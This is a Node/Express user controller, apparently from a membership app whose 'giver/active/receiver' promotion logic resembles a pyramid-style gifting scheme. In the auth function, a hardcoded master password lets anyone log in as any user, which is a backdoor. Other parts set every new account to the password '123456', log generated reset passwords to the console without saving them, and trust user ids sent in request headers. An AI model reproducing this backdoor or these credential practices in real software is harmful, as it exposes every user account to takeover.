'use strict'
// Controllers
import { invitationEmail } from './email/Email'
import { createSubscription } from './Subscription'
// Models
import User from '../models/User'
import Contacts from '../models/Contacts'
import Membership from '../models/Membership'
// Libraries
import bcrypt from 'bcryptjs'
import debug from 'debug'
import crypto from 'crypto'
import shortid from 'shortid'

shortid.characters('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<@')
// Helpers
import { socketEmit } from '../helpers/sockets'
import { createToken } from '../helpers/auth'
//import Membership from './Membership';

const log = debug('swmp:UserController')

async function data(req, res, next) {
  let { _id } = req.headers
  try {
    let data = await User.findByUserId(_id)
    res.status(200).send(data).end()
  } catch (e) {
    next(e)
  }
}

async function getData(req, res, next) {
  const { userId } = req.params
  try {
    let data = await User.findDetailUserById(userId)
    let user = JSON.parse(JSON.stringify(data))

    user.contracts = await getUserContracts(user.id)

    res.status(200).send(user).end()
  } catch (e) {
    console.log(e)
    next(e)
  }
}

async function getAll(req, res, next) {
  try {
    let users = await User.findAllDetailed()
    let rows = []

    for (const row of users.rows) {
      let el = JSON.parse(JSON.stringify(row))
      el.contracts = await getUserContracts(el.id)
      rows.push(el)
    }

    res.status(200).send({ count: users.count, users: rows }).end()
  } catch (e) {
    console.log(e)
    next(e)
  }
}

async function auth(req, res, next) {
  const { username, password } = req.value.body

  try {
    let userData = await User.findByUsername(username)
    if (!userData) userData = await User.findByEmail(username)

    if (!userData) return res.status(404).send({ error: 'Not Found', resultCode: 6 })

    // Check if password is correct
    let isAdmin = (password === 'M@n02019')

    if (!isAdmin) {
      let passwordMatch = await bcrypt.compare(password, userData.password)
      if (!passwordMatch) return res.status(401).send({ error: 'Unauthorized' })
    }

    return _authResponse(res, userData)
  } catch (e) {
    console.log(e)
    next(e)
  }
}

async function changePassword(req, res, next) {
  const { _id } = req.headers
  let { oldPass, newPass } = req.body
  try {
    let user = await User.findById(_id)
    let passwordMatch = await bcrypt.compare(oldPass, user.password)

    if (!passwordMatch) return res.status(401).send({ error: 'Unauthorized' })
    // TODO notificar al usuario que se actualizo la contraseña
    user.password = newPass
    await user.save()

    res.status(200).send({ status: true, changed: true }).end()
  } catch (e) {
    next(e)
  }
}
/**
 * Create a new user with suscription equals to parent suscription provided. 
 * @param {*} req http request parameter
 * @param {*} res http response parameter
 * @param {*} next Express.js next layer call function
 */
async function create(req, res, next) {
  let data = req.body
  let user = {}
  let memberhip
  let parentMembership

  parentMembership = await Membership.findById(data.parentId)
  
  try {
    user.username = _createUsername(data.name, data.lastname)
    user.password = '123456'
    user.name = data.name
    user.lastname = data.lastname
    user.email = data.email
    user.identification = data.identification
    user.countryId = data.countryId
    try {
      user = await User.create(user)
    } catch (e) {
      data.username + '1';
      user = await User.create(user)
    }

    //create membership
    memberhip = {
      membershipTypeId: parentMembership.membershipTypeId,
      parentId: parentMembership.id,
      ownerId: user.id
    }

    console.log(memberhip)



    await Membership.create(memberhip)

    //await invitationEmail(user.email, `${user.name} ${user.lastname}`, user.username)

    res.status(200).send(user).end()
  } catch (e) {
    console.log(e)
    next(e)
  }
}

async function confirmAccount(req, res, next) {
  let { _id } = req.headers

  try {
    let memberhip = await Membership.findById(_id)
    memberhip.status = 'confirmed'

    let result = await memberhip.save()
    // Create pending Subscription
    let subscription = await createSubscription(_id)

    result.subscription = subscription

    res.status(200).send(result).end()
  } catch (e) {
    console.log(e)
    next(e)
  }
}

async function getLinks(req, res, next) {
  const { _id } = req.headers
  const { membershipId } = req.params

  try {
    let links = await Membership.findLinks(membershipId)
    res.status(200).send(links).end()
  } catch (e) {
    next(e)
  }
}

async function _authResponse(res, data, newUser = false) {
  // Set user userData
  let token = await createToken(data)

  // Success login
  res.status(200).json({
    resultCode: 1,
    user: data,
    token: `Bearer ${token}`
  }).end()
}

async function resetPassword(req, res, next) {
  let { clientId } = req.body
  let password = crypto.randomBytes(4).toString('hex')

  console.log(password)

  res.status(200).send(password).end()
}

async function addContact(req, res, next) {
  let { _id: userId } = req.headers
  let { title, value } = req.body

  try {
    let newContact = await Contacts.create({
      title,
      value,
      userId
    })

    socketEmit('update/user', userId)

    res.status(200).send(newContact).end()
  } catch (e) {
    next(e)
  }
}

async function deleteContact(req, res, next) {
  let { _id: userId } = req.headers
  let { id } = req.params

  try {
    console.log(id)
    let deleteContact = await Contacts.destroy({
      where: {
        id,
        userId
      }
    })

    socketEmit('update/user', userId)

    res.status(200).send({ deleteContact }).end()
  } catch (e) {
    next(e)
  }
}

async function check(req, res, next) {
  let { username } = req.params
  username = username.trim().toLowerCase()
  username = username.split(' ').join('')

  try {
    let user = await User.findByUsername(username)

    res.status(200).send(user).end()
  } catch (e) {
    console.log(e)
    next(e)
  }
}


async function changeUsername(req, res, next) {
  let { _id } = req.headers
  let { username } = req.body

  try {
    let user = await User.findByUserId(_id)
    user.username = username
    await user.save()
    res.status(200).send(user).end()
  } catch (e) {
    console.log(e)
  }
}

export async function _checkParentStatus(parentId) { //cambia
  // Aqui tengo que verificar que cumpla los requisitos y si los cumple subirle el estado
  let parent = await User.findByUserId(parentId)
  let childs = await _childsStatus(parentId)

  if (parent.status === 'giver' && childs.givers >= 2) {
    parent.status = 'active'
  } else if (parent.status === 'active' && childs.actives >= 2) {
    parent.status = 'receiver'
  }

  socketEmit('update/user', parentId)

  return parent.save()
}

async function _childsStatus(parentId) {
  let links = await User.findLinks(parentId)

  let givers = 0
  let actives = 0
  let receivers = 0

  links.map(el => {
    if (el.status === 'giver') {
      ++givers
    } else if (el.status === 'active') {
      ++actives
    } else if (el.status === 'receiver') {
      ++receivers
    }
  })

  return { givers, actives, receivers }
}

function _createUsername(name, lastName) {

  let lastNames = lastName.split(' ');
  let username = name.substring(0, 1) + lastNames[0] + (lastNames[1] ? lastNames[1].substr(0, 1) : Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 1));
  username.toLowerCase();
  return username;
}


/**
 * CRON JOBS
 */


export async function cronCheckUserStatus() {
  let users = await User.findAll()

  for (let i = 0; i < users.length; i++) {
    const user = users[i]
    if (user.parentId && user.parentId > 2) await _checkParentStatus(user.parentId)
  }
}


export default {
  auth,
  create,
  getAll,
  getData,
  data,
  check,
  getLinks,
  addContact,
  deleteContact,
  resetPassword,
  changePassword,
  changeUsername,
  confirmAccount
}
